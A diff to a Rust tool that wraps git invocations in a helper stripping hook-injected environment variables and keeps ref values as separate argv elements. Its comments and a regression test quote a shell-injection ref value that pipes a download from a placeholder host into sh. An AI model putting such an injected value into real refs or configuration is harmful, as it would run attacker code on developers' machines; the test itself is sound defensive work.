@@ -48,10 +48,21 @@ impl DiffMap {
     }
 }
 
+/// Every git child must ignore hook-injected env: an inherited
+/// GIT_INDEX_FILE/GIT_DIR/GIT_WORK_TREE redirects this process's git
+/// children at the CALLER's repo state (a pre-commit hook's index),
+/// corrupting it. Always spawn git through here.
+fn git_cmd(repo: &Path) -> Command {
+    let mut cmd = Command::new("git");
+    cmd.arg("-C").arg(repo);
+    cmd.env_remove("GIT_INDEX_FILE");
+    cmd.env_remove("GIT_DIR");
+    cmd.env_remove("GIT_WORK_TREE");
+    cmd
+}
+
 fn git_diff(root: &Path, base: &str) -> anyhow::Result<DiffMap> {
-    let probe = Command::new("git")
-        .arg("-C")
-        .arg(root)
+    let probe = git_cmd(root)
         .args(["rev-parse", "--is-inside-work-tree"])
         .output()
         .context("running git (is it installed?)")?;
@@ -64,9 +75,7 @@ fn git_diff(root: &Path, base: &str) -> anyhow::Result<DiffMap> {
     }
     // --relative both restricts the diff to the scan root and emits paths
     // relative to it; -U0 hunks carry exact touched ranges (D7a).
-    let out = Command::new("git")
-        .arg("-C")
-        .arg(root)
+    let out = git_cmd(root)
         .args([
             "diff",
             "--no-ext-diff",
@@ -280,13 +289,10 @@ struct BaseWorktree {
 /// `'"$;|{}`; the old `sh -c` string-interpolated it, so a malicious ref like
 /// `x';curl${IFS}evil|sh;'` executed arbitrary commands (cute-coral). Passing
 /// every value as its own argv element makes those metacharacters inert.
-fn archive_argv(repo: &Path, base: &str, dest: &Path) -> (Vec<OsString>, Vec<OsString>) {
-    let git = vec![
-        OsString::from("-C"),
-        repo.as_os_str().to_os_string(),
-        OsString::from("archive"),
-        OsString::from(base),
-    ];
+/// The `-C <repo>` git normally needs is supplied by `git_cmd` at the call
+/// site, not here, so it isn't emitted twice.
+fn archive_argv(base: &str, dest: &Path) -> (Vec<OsString>, Vec<OsString>) {
+    let git = vec![OsString::from("archive"), OsString::from(base)];
     let tar = vec![
         OsString::from("-x"),
         OsString::from("-C"),
@@ -299,9 +305,7 @@ impl BaseWorktree {
     fn add(repo: &Path, base: &str) -> anyhow::Result<BaseWorktree> {
         let dir = tempfile::TempDir::new()?;
         let path = dir.path().join("base");
-        let out = Command::new("git")
-            .arg("-C")
-            .arg(repo)
+        let out = git_cmd(repo)
             .args(["worktree", "add", "--detach", "-q"])
             .arg(&path)
             .arg(base)
@@ -320,11 +324,11 @@ impl BaseWorktree {
         // attributes, so an attribute-excluded file would be missing from the
         // base scan; acceptable for a fallback path.
         std::fs::create_dir_all(&path)?;
-        let (git_args, tar_args) = archive_argv(repo, base, &path);
+        let (git_args, tar_args) = archive_argv(base, &path);
         // Spawn `git archive` and pipe its stdout straight into `tar -x`. Every
         // value is a verbatim argv element — no `sh -c`, so refname/path
         // metacharacters (`'"$;|{}`) can't be interpreted (cute-coral).
-        let mut git = Command::new("git")
+        let mut git = git_cmd(repo)
             .args(&git_args)
             .stdout(Stdio::piped())
             .stderr(Stdio::piped())
@@ -365,9 +369,7 @@ impl Drop for BaseWorktree {
         if self.archived {
             return; // TempDir cleanup suffices
         }
-        let _ = Command::new("git")
-            .arg("-C")
-            .arg(&self.repo)
+        let _ = git_cmd(&self.repo)
             .args(["worktree", "remove", "--force"])
             .arg(self.path())
             .output();
@@ -433,9 +435,7 @@ fn base_state_cfg_sig(cfg: &Config, legs: &VersionLegs) -> u64 {
 ///   the same entry set. Cached transiently under .reprise/base-state/ keyed
 ///   by resolved base SHA + config, so repeat checks skip the base scan.
 fn base_state(root: &Path, cfg: &Config, base: &str) -> anyhow::Result<(Baseline, String)> {
-    let sha_out = Command::new("git")
-        .arg("-C")
-        .arg(root)
+    let sha_out = git_cmd(root)
         .args(["rev-parse", "--verify"])
         .arg(format!("{base}^{{commit}}"))
         .output()?;
@@ -901,15 +901,13 @@ deleted file mode 100644
         // A malicious `[baseline] ref` can pin a refname with shell metacharacters;
         // the old `sh -c` executed them. Each value must be one verbatim argv
         // element, and no element may be a shell string joining the pieces.
-        let repo = Path::new("/repos/it's mine");
+        // (`-C <repo>` is supplied by `git_cmd` at the call site, not here.)
         let base = "x';curl${IFS}evil|sh;'";
         let dest = Path::new("/tmp/base dir");
-        let (git, tar) = archive_argv(repo, base, dest);
+        let (git, tar) = archive_argv(base, dest);
         assert_eq!(
             git,
             vec![
-                OsString::from("-C"),
-                OsString::from("/repos/it's mine"),
                 OsString::from("archive"),
                 OsString::from("x';curl${IFS}evil|sh;'"),
             ]
